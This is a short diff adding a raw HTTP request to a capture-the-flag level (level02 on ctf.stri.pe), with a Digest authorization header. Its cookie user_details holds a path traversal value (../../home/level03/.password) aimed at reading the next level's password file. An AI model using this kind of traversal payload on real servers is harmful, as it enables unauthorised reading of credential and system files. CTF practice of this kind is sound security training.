@@ -1,0 +1,6 @@
+GET /level02.php HTTP/1.1
+Host: ctf.stri.pe
+Authorization:Digest username="level02", realm="ctf.stri.pe", nonce="54+NfJ+5BAA=6ac2a503b4ff205168dc40c7af53c286a4abebbd", uri="/level02.php", algorithm=MD5, response="e4f7b3fa97a1b95bb70d395aee2b6d04", qop=auth, nc=00000005, cnonce="d082eeeb33cabc3e"
+Cookie:user_details=../../home/level03/.password
+
+
